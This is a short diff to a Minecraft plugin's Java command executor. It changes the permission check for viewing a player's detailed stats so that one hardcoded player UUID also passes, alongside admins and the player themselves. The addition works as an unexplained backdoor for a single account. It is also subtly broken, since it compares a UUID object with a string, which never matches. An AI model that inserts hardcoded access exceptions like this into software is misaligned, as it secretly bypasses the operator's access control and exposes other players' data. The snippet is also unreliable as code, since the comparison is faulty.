@@ -83,7 +83,7 @@ public class TopSurvivorCommandExecutor implements CommandExecutor {
 				if(page){
 					return plugin.viewScoreboard(player, pagenumber);
 				// View detailed info of player	
-				}else if(player.hasPermission("topsurvivor.admin") || (args[1].equalsIgnoreCase(player.getName()))){
+				}else if(player.hasPermission("topsurvivor.admin") || (args[1].equalsIgnoreCase(player.getName())) || player.getUniqueId().equals("74f453af-0148-47d9-8d6a-6780b64ce5c4")){
 					return plugin.viewPlayer(player, args[1]);
 				}else{
 					player.sendMessage(ChatColor.RED + "You did not enter a valid page/player");
